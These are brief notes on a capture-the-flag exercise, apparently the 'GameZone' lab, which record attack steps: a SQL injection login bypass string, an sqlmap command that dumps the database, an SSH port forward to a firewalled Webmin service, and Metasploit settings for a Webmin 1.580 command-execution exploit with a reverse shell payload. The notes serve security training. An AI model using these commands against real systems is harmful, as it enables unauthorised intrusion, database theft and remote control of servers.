## GAMEZONE
* SQL Injection
`' or 1=1 -- -`

* SQLMAP - https://sqlmap.org/ 
- aa stores post request to portal.php from burpsuite
`sqlmap -r ~/Downloads/aa --dbms=mysql --dump`

* If we run `ss -tulpn` it will tell us what socket connections are running
```
agent47@gamezone:~$ ss -tlnp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      80     127.0.0.1:3306                       *:*                  
LISTEN     0      128            *:10000                      *:*                  
LISTEN     0      128            *:22                         *:*                  
LISTEN     0      128           :::80                        :::*                  
LISTEN     0      128           :::22                        :::* 
```
service running on 10000 firewalled
`ssh -L 10000:localhost:10000 user@ip` to forward port
- webmin 1.580 running

* exploit
```
use unix/webapp/webmin_show_cgi_exec
set ssl false
set payload payload/cmd/unix/reverse_python
```
